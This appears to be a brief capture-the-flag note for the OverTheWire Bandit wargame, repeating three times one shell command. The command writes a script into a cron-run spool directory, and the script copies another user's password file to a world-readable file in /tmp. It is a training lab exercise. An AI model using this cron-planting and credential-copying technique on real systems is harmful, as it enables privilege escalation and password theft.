8cat > /var/spool/bandit24/foo/getpass.sh <<'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_bandit24_result
chmod 644 /tmp/my_bandit24_result
EOF




cat > /var/spool/bandit24/foo/getpass.sh <<'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_bandit24_result
chmod 644 /tmp/my_bandit24_result
EOF


cat > /var/spool/bandit24/foo/getpass.sh <<'EOF' && chmod 755 /var/spool/bandit24/foo/getpass.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/my_bandit24_result
chmod 644 /tmp/my_bandit24_result
EOF
